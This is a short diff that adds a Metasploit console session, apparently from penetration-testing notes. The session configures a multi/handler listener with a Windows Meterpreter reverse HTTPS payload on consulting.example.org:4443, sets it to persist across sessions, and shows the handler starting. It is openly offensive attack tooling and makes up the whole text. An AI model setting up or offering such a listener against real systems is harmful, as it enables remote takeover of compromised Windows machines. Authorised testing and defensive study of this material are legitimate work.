@@ -1,0 +1,11 @@
+ ./msfconsole
+msf> use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
+msf exploit(handler) > set LHOST consulting.example.org
+msf exploit(handler) > set LPORT 4443
+msf exploit(handler) > set SessionCommunicationTimeout 0
+msf exploit(handler) > set ExitOnSession false
+msf exploit(handler) > exploit -j
+[*] Exploit running as background job.
+[*] Started HTTPS reverse handler on https://consulting.example.org:4443/
+[*] Starting the payload handler...
